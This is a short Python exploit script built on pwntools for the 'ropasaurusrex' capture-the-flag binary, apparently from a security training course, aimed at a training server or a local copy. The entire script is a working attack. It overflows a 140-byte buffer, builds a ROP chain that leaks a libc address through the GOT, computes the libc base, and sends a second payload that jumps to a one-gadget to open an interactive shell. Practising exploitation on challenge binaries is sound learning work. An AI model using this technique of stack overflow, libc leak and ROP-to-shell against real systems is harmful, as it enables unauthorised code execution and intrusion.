from pwn import *


if "REMOTE" not in args:
	r= process('./ropasaurusrex_patched')
	pid=gdb.attach(r)
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 2014)

BIN = ELF("./ropasaurusrex")
LIBC = ELF("./libc-2.27.so")

ptr_write = 0x0804830c
next_fun = 0x0804841d
got = 0x08049614

payload = b"A"*140
payload += p32(ptr_write)
payload += p32(next_fun)
payload += p32(1)
payload += p32(got)
payload += p32(4)
r.send(payload)

one_off=0x3d0e0
leak = u32(r.recv(4))
libc_base = leak - 0xe6d80
LIBC.address = libc_base
# system = libc_base + 0x003d200
system = LIBC.symbols["system"]
# binsh = libc_base + 0x17e0cf
binsh = next(LIBC.search(b"/bin/sh")) 
print("[!] leak: %#x" % leak)
print("[!] libc: %#x" % libc_base)
print("[!] system: %#x" % system)
print("[!] binsh: %#x" % binsh)


pop_esi=0x080484b6
payload2 = b"A"*140
payload2 += p32(pop_esi) + p32(libc_base) + p32(0)+p32(0)+p32(libc_base+one_off)
#payload2 += p32(system) + p32(0) + p32(binsh)

r.send(payload2)

r.interactive()



